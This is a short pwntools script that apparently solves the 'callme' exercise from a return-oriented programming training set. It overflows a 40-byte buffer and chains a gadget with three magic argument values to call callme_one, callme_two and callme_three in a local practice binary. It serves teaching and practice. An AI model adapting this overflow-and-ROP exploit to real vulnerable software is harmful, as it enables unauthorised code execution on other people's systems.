from pwn import *

pr = process("./callme")

elf = ELF("./callme")

one = p64(elf.sym["callme_one"])
two = p64(elf.sym["callme_two"])
three = p64(elf.sym["callme_three"])
beef = p64(0xdeadbeefdeadbeef)
babe = p64(0xcafebabecafebabe)
dude = p64(0xd00df00dd00df00d)
payload = b"A"*40

gadget = p64(0x000000000040093c) + beef + babe + dude 

payload += gadget +  one + gadget + two + gadget + three 
pr.sendline(payload)
print(pr.recvall().decode())
